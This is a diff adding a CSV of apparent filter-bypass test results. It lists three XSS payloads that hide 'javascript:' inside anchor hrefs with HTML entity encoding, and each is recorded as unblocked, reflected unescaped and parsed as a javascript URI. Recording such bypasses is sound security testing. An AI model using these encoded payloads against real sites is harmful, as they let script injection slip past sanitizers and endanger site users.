@@ -1,0 +1,4 @@
+id,kind,payload,blocked,fired_rule,decoded_href,endpoint_status,reflected_unescaped,parsed_javascript_uri
+B1-XSS-01,B1 bypass,<a href=jav&#x61;script:alert(1)>click</a>,False,,javascript:alert(1),200,True,True
+B1-XSS-02,B1 bypass,<a href=j&#97;vascript:alert(1)>click</a>,False,,javascript:alert(1),200,True,True
+B1-XSS-03,B1 bypass,<a href=java&#x73;cript:alert(1)>click</a>,False,,javascript:alert(1),200,True,True
